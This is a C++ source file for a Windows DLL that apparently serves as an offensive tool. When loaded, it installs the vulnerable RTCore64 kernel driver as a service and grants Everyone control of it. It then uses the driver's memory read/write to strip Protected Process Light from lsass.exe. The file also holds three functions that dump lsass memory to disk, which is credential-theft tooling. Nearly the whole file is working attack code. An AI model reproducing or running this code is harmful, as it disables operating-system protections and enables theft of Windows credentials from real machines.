// ppl_strip.cpp

/*
    Author   : ripmeep
    Instagram: @rip.meep
    GitHub   : https://github.com/ripmeep/
 */

/*    INCLUDES    */
//  UNCOMMENT THIS FIRST INCLUDE IF YOU'RE USING VISUAL STUDIO TO COMPILE DLL
//  #include "pch.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <WtsApi32.h>
#include <Psapi.h>
#include <DbgHelp.h>
#include <AclAPI.h>
#include <ProcessSnapshot.h>
#include <winternl.h>

/*    MACROS & CONSTANTS    */
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "mpr.lib")

#define PPL_STRIP_DRIVER_BIN_PATH   L"C:\\Windows\\Temp\\RTCore64.sys"
// #define PPL_STRIP_SERVICE_NAME      L"RTCore64"

static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

/*    TYPEDEFS    */
typedef struct kernel_offsets_t {
    DWORD64 unique_pid_offset;
    DWORD64 active_proc_links_offset;
    DWORD64 token_offset;
    DWORD64 sig_level_offset;
} KERNEL_OFFSETS;

typedef struct RTCORE64_MEMORY_READ_t {
    BYTE    pad0[8];
    DWORD64 addr;
    BYTE    pad1[8];
    DWORD   rd_size;
    DWORD   value;
    BYTE    pad3[16];
} RTCORE64_MEMORY_READ;

/*    FUNCTION DECLARATIONS    */
extern "C"
{
    NTSYSCALLAPI NTSTATUS NTAPI NtCreateProcessEx(__out    PHANDLE            phHandle,
                                                  __in     ACCESS_MASK        desiredAccess,
                                                  __in_opt POBJECT_ATTRIBUTES objAttributes,
                                                  __in     HANDLE             hParentProcess,
                                                  __in     ULONG              ulFlags,
                                                  __in_opt HANDLE             hSectHandle,
                                                  __in_opt HANDLE             hDebugReport,
                                                  __in_opt HANDLE             hExceptionPort,
                                                  __in     ULONG              ulJobMemberLevel);
}

/*    FUNCTIONS DEFINITIONS   */
BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle) { // FROM MIMIKATZ
    BOOL                        status = FALSE;
    DWORD                       dwSizeNeeded;
    PSECURITY_DESCRIPTOR        oldSd, newSd;
    SECURITY_DESCRIPTOR         dummySdForXP;
    SID_IDENTIFIER_AUTHORITY    SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    EXPLICIT_ACCESS             ForEveryOne = {
        SERVICE_QUERY_STATUS         | SERVICE_QUERY_CONFIG         | SERVICE_INTERROGATE |
        SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE       | SERVICE_START       | 
        SERVICE_STOP                 | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
        SET_ACCESS,
        NO_INHERITANCE,
        { NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL }
    };

    if (!QueryServiceObjectSecurity(monHandle,
                                    DACL_SECURITY_INFORMATION,
                                    &dummySdForXP,
                                    0,
                                    &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
    {
        if (oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded)) 
        {
            if (QueryServiceObjectSecurity(monHandle,
                                           DACL_SECURITY_INFORMATION,
                                           oldSd,
                                           dwSizeNeeded,
                                           &dwSizeNeeded))
            {
                if (AllocateAndInitializeSid(&SIDAuthWorld,
                                             1,
                                             SECURITY_WORLD_RID,
                                             0,
                                             0,
                                             0,
                                             0,
                                             0,
                                             0,
                                             0,
                                             (PSID*)&ForEveryOne.Trustee.ptstrName))
                {
                    if (BuildSecurityDescriptor(NULL,
                                                NULL,
                                                1,
                                                &ForEveryOne,
                                                0,
                                                NULL,
                                                oldSd,
                                                &dwSizeNeeded,
                                                &newSd) == ERROR_SUCCESS)
                    {
                        status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
                        LocalFree(newSd);
                    }

                    FreeSid(ForEveryOne.Trustee.ptstrName);
                }
            }

            LocalFree(oldSd);
        }
    }

    return status;
}

DWORD ServiceInstall(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath,
                     DWORD dwServiceType, DWORD dwStartType, BOOL bStart)
{
    BOOL        bStatus;
    SC_HANDLE   hSC, hS;

    bStatus = FALSE;
    hSC = NULL;
    hS = NULL;

    hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    hS = OpenService(hSC, serviceName, SERVICE_START);

    if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
    {
        hS = CreateService(hSC,
                           serviceName,
                           displayName,
                           READ_CONTROL | WRITE_DAC | SERVICE_START,
                           dwServiceType,
                           dwStartType,
                           SERVICE_ERROR_NORMAL,
                           binPath,
                           NULL,
                           NULL,
                           NULL,
                           NULL,
                           NULL);

        bStatus = kull_m_service_addWorldToSD(hS);

        if (hS && bStart)
        {
            bStatus = StartService(hS, 0, NULL);

            CloseServiceHandle(hS);
        }

        CloseServiceHandle(hSC);

        return bStatus;
    }
}

BOOL EnableDebugPrivilege()
{
    HANDLE  hProc;
    HANDLE  hToken;
    BOOL    bRet;
    PDWORD  dwRetLen;

    bRet = FALSE;
    dwRetLen = NULL;

    hProc = GetCurrentProcess();

    if (OpenProcessToken(hProc, TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        LUID luid;

        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
        {
            TOKEN_PRIVILEGES tp;

            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (AdjustTokenPrivileges(hToken,
                                      FALSE,
                                      &tp,
                                      0,
                                      (PTOKEN_PRIVILEGES)NULL,
                                      dwRetLen))
                bRet = (GetLastError() == ERROR_SUCCESS);
        }

        CloseHandle(hToken);
    }

    return bRet;
}

DWORD GetProcessIdByName(LPCWSTR lpProcName)
{
    WTS_PROCESS_INFO*   pWPIs;
    DWORD               dwProcessId, dwProcessCount;

    pWPIs = NULL;
    dwProcessId = 0;
    dwProcessCount = 0;

    WTSEnumerateProcesses(WTS_CURRENT_SERVER,
                          0,
                          1,
                          &pWPIs,
                          &dwProcessCount);

    for (DWORD i = 0; i < dwProcessCount; i++)
    {
        if (!lstrcmpW(pWPIs[i].pProcessName, lpProcName))
        {
            dwProcessId = pWPIs[i].ProcessId;

            break;
        }
    }

    return dwProcessId;
}

void WriteMemoryPrimitive(HANDLE hDevice, DWORD dwSize,
                          DWORD64 dwAddr, DWORD dwValue)
{
    RTCORE64_MEMORY_READ rtMemRead{};
    DWORD dwBytesRet;

    rtMemRead.addr = dwAddr;
    rtMemRead.rd_size = dwSize;
    rtMemRead.value = dwValue;

    DeviceIoControl(hDevice,
                    RTCORE64_MEMORY_WRITE_CODE,
                    &rtMemRead,
                    sizeof(rtMemRead),
                    &rtMemRead,
                    sizeof(rtMemRead),
                    &dwBytesRet,
                    NULL);
}

DWORD ReadMemoryPrimitive(HANDLE hDevice, DWORD dwSize, DWORD64 dwAddr)
{
    RTCORE64_MEMORY_READ rtMemRead{};

    rtMemRead.addr = dwAddr;
    rtMemRead.rd_size = dwSize;

    DWORD dwBytesRet;

    DeviceIoControl(hDevice,
                    RTCORE64_MEMORY_READ_CODE,
                    &rtMemRead,
                    sizeof(rtMemRead),
                    &rtMemRead,
                    sizeof(rtMemRead),
                    &dwBytesRet,
                    NULL);

    return rtMemRead.value;
}

DWORD ReadMemoryDWORD(HANDLE hDevice, DWORD64 dwAddr)
{
    return ReadMemoryPrimitive(hDevice, 4, dwAddr);
}

DWORD64 ReadMemoryDWORD64(HANDLE hDevice, DWORD64 dwAddr)
{
    return (static_cast<DWORD64>(ReadMemoryDWORD(hDevice, dwAddr + 4)) << 32) | ReadMemoryDWORD(hDevice, dwAddr);
}

unsigned long long GetKernelBaseAddr()
{
    DWORD   dwOut;
    DWORD   dwNb;
    PVOID* base;

    dwOut = 0;
    dwNb = 0;
    base = NULL;

    if (EnumDeviceDrivers(NULL, 0, &dwNb))
    {
        base = (PVOID*)malloc(dwNb);

        if (EnumDeviceDrivers(base, dwNb, &dwOut))
            return (unsigned long long)base[0];

        return 0;
    }

    return 0;
}

KERNEL_OFFSETS GetVersionOffsets()
{
    return KERNEL_OFFSETS{ 0x0440, 0x0448, 0x04B8, 0x0878 }; // WINDOWS RELEASE 2009
}

void DisableProtectedProcess(DWORD dwProcessId, KERNEL_OFFSETS koOffsets)
{
    HANDLE              hDevice;
    unsigned long long  ullNtoskrnlBaseAddr;
    HMODULE             hNtoskrnl;
    DWORD64             dwPsInitialSystemProcessOffset, dwPsInitialSystemProcessAddress, dwTargetProcessId,
                        dwProcessHead, dwCurrentProcessAddress, dwProcessAddress, dwUniqueProcessId;

    hDevice = CreateFile(LR"(\\.\RTCore64)",
                         GENERIC_READ | GENERIC_WRITE,
                         0,
                         NULL,
                         OPEN_EXISTING,
                         0,
                         NULL);

    ullNtoskrnlBaseAddr = GetKernelBaseAddr();
    hNtoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    dwPsInitialSystemProcessOffset = reinterpret_cast<DWORD64>(GetProcAddress(hNtoskrnl, "PsInitialSystemProcess")) - reinterpret_cast<DWORD64>(hNtoskrnl);

    FreeLibrary(hNtoskrnl);

    dwPsInitialSystemProcessAddress = ReadMemoryDWORD64(hDevice, ullNtoskrnlBaseAddr + dwPsInitialSystemProcessOffset);
    dwTargetProcessId = static_cast<DWORD64>(dwProcessId);
    dwProcessHead = dwPsInitialSystemProcessAddress + koOffsets.active_proc_links_offset;
    dwCurrentProcessAddress = dwProcessHead;

    do
    {
        dwProcessAddress = dwCurrentProcessAddress - koOffsets.active_proc_links_offset;
        dwUniqueProcessId = ReadMemoryDWORD64(hDevice, dwProcessAddress + koOffsets.unique_pid_offset);

        if (dwUniqueProcessId == dwTargetProcessId)
            break;

        dwCurrentProcessAddress = ReadMemoryDWORD64(hDevice, dwProcessAddress + koOffsets.active_proc_links_offset);
    } while (dwCurrentProcessAddress != dwProcessHead);

    dwCurrentProcessAddress -= koOffsets.active_proc_links_offset;

    WriteMemoryPrimitive(hDevice, 4, dwCurrentProcessAddress + koOffsets.sig_level_offset, 0x00);

    CloseHandle(hDevice);
}

BOOL MiniDumpLsassToFile(LPCWSTR outPath)
{
    HANDLE                          hFile, hProc;
    DWORD                           dwProcessId, dwProcessCount;
    WTS_PROCESS_INFO* pWPIs;
    BOOL                            bRet;
    char                            buf[2048];
    //  DWORD                           dwWineOpt;

    dwProcessCount = 0;
    pWPIs = NULL;

    WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE,
                          NULL,
                          1,
                          &pWPIs,
                          &dwProcessCount);

    for (DWORD i = 0; i < dwProcessCount; i++)
    {
        if (!lstrcmpW(pWPIs[i].pProcessName, L"lsass.exe"))
        {
            dwProcessId = pWPIs[i].ProcessId;

            break;
        }
    }

    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

    hFile = CreateFile(outPath,
                       GENERIC_READ | GENERIC_WRITE,
                       0,
                       NULL,
                       CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);

    //  SymSetOptions( (dwWineOpt = SymGetOptions()) | 0x40000000 );

    bRet = MiniDumpWriteDump(hProc,
                             dwProcessId,
                             hFile,
                             (MINIDUMP_TYPE)(MiniDumpWithFullMemory | MiniDumpWithFullMemoryInfo | MiniDumpWithHandleData | MiniDumpWithThreadInfo | MiniDumpWithUnloadedModules),
                             NULL,
                             NULL,
                             NULL);

    //  SymSetOptions(dwWineOpt);

    CloseHandle(hFile);

    return bRet;
}

HANDLE CreateChildProcessMiniDump(DWORD dwProcessId, LPCWSTR lpOutFile)
{
    HANDLE      hProc, hSnapshot, hFile;
    NTSTATUS    status;

    hProc = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwProcessId);

    status = NtCreateProcessEx(&hSnapshot,
                               PROCESS_ALL_ACCESS,
                               NULL,
                               hProc,
                               0,
                               NULL,
                               NULL,
                               NULL,
                               0);

    hFile = CreateFile(lpOutFile,
                       GENERIC_ALL,
                       0,
                       NULL,
                       CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);

    MiniDumpWriteDump(hSnapshot,
                      dwProcessId,
                      hFile,
                      (MINIDUMP_TYPE)(MiniDumpWithFullMemory | MiniDumpWithFullMemoryInfo | MiniDumpWithHandleData | MiniDumpWithThreadInfo | MiniDumpWithUnloadedModules),
                      NULL,
                      NULL,
                      NULL);

    CloseHandle(hFile);

    return (NT_SUCCESS(status) ? hSnapshot : NULL);
}

BOOL MiniDumpWriteDumpCallback(__in       PVOID                     pCallbackParam, 
                               __in const PMINIDUMP_CALLBACK_INPUT  pCallbackInput,
                               __inout    PMINIDUMP_CALLBACK_OUTPUT pCallbackOutput)
{
    switch (pCallbackInput->CallbackType)
    {
    case 16:
        pCallbackOutput->Status = S_FALSE;
        break;
    }

    return TRUE;
}

BOOL CreatePssSnapshotMiniDump(DWORD dwProcessId, LPCWSTR lpOutFile)
{
    DWORD                           dwFlags;
    HANDLE                          hLsass, hSnapshot, hFile;
    BOOL                            bDumped;
    MINIDUMP_CALLBACK_INFORMATION   callbackInfo;



    hLsass = NULL;
    hSnapshot = NULL;
    hFile = NULL;

    hFile = CreateFile(lpOutFile,
                       GENERIC_ALL,
                       0,
                       NULL,
                       CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);

    hLsass = OpenProcess(PROCESS_ALL_ACCESS, 0, dwProcessId);
    dwFlags = (DWORD)PSS_CAPTURE_VA_CLONE          | PSS_CAPTURE_HANDLES                           | PSS_CAPTURE_HANDLE_NAME_INFORMATION | \
              PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION  | PSS_CAPTURE_HANDLE_TRACE            | \
              PSS_CAPTURE_THREADS                  | PSS_CAPTURE_THREAD_CONTEXT                    | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | \
              PSS_CREATE_BREAKAWAY                 | PSS_CREATE_BREAKAWAY_OPTIONAL                 | PSS_CREATE_USE_VM_ALLOCATIONS       | PSS_CREATE_RELEASE_SECTION;

    ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));

    callbackInfo.CallbackRoutine = &MiniDumpWriteDumpCallback;
    callbackInfo.CallbackParam = NULL;

    PssCaptureSnapshot(hLsass,
                       (PSS_CAPTURE_FLAGS)dwFlags,
                       CONTEXT_ALL,
                       (HPSS*)&hSnapshot);

    bDumped = MiniDumpWriteDump(hSnapshot,
                                dwProcessId,
                                hFile,
                                (MINIDUMP_TYPE)(MiniDumpWithFullMemory | MiniDumpWithFullMemoryInfo | MiniDumpWithHandleData | MiniDumpWithThreadInfo | MiniDumpWithUnloadedModules),
                                NULL,
                                NULL,
                                &callbackInfo);

    CloseHandle(hFile);

    PssFreeSnapshot(GetCurrentProcess(), (HPSS)hSnapshot);

    return bDumped;
}

/*    DLLMAIN    */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    DWORD           dwProcessId;
    KERNEL_OFFSETS  koOffsets;
    SC_HANDLE       hSC = NULL, hS = NULL;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
        ServiceInstall(L"RTCore64",
                       L"RTCore64",
                       PPL_STRIP_DRIVER_BIN_PATH,
                       SERVICE_KERNEL_DRIVER,
                       SERVICE_AUTO_START,
                       TRUE);
        

        hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
        hS = OpenService(hSC, L"RTCore64", SERVICE_START);

        kull_m_service_addWorldToSD(hS);
        
        StartService(hS, 0, NULL);

        CloseServiceHandle(hSC);
        CloseServiceHandle(hS);

        dwProcessId = GetProcessIdByName(L"lsass.exe");
        koOffsets = GetVersionOffsets();

        DisableProtectedProcess(dwProcessId, koOffsets);

        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
